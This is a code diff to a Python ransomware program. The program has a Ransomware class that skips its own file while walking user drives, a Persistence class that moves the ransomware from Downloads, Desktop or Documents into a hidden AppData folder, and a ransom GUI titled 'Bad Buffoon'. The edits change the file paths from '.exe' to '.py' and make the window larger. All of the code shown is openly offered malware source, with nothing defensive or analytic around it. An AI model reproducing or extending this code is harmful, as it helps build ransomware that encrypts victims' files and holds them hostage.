@@ -181,7 +181,7 @@ class Ransomware : #  Ransomware class
 
                         continue
 
-                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login) or abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login) : 
+                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login) or abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login) : 
 
                         continue
 
@@ -254,7 +254,7 @@ class Persistence:
         'Check if files is in directory and move the ransomware file into our directory'
         try : 
             
-            if os.path.isfile('{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login)) is True : # If our ransomware is already in our files
+            if os.path.isfile('{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login)) is True : # If our ransomware is already in our files
 
                 pass
 
@@ -262,9 +262,9 @@ class Persistence:
 
                 os.rename('{}\\Users\\{}\\Downloads\\ransomware.py'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login))
 
-            elif os.path.isfile('{}\\Users\\{}\\Desktop\\ransomware.exe'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware
+            elif os.path.isfile('{}\\Users\\{}\\Desktop\\ransomware.py'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware
 
-                os.rename('{}\\Users\\{}\\Desktop\\ransomware.exe'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login))
+                os.rename('{}\\Users\\{}\\Desktop\\ransomware.py'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login))
 
             elif os.path.isfile('{}\\Users\\{}\\Documents\\ransomware.py'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware
 
@@ -398,7 +398,7 @@ class GUI :
 
         try : 
             self.app.title('Bad Buffoon')
-            self.app.geometry('1000x700')
+            self.app.geometry('1360x900')
             self.app.resizable(width=False, height= False)
             self.app['bg'] = 'red4'
 
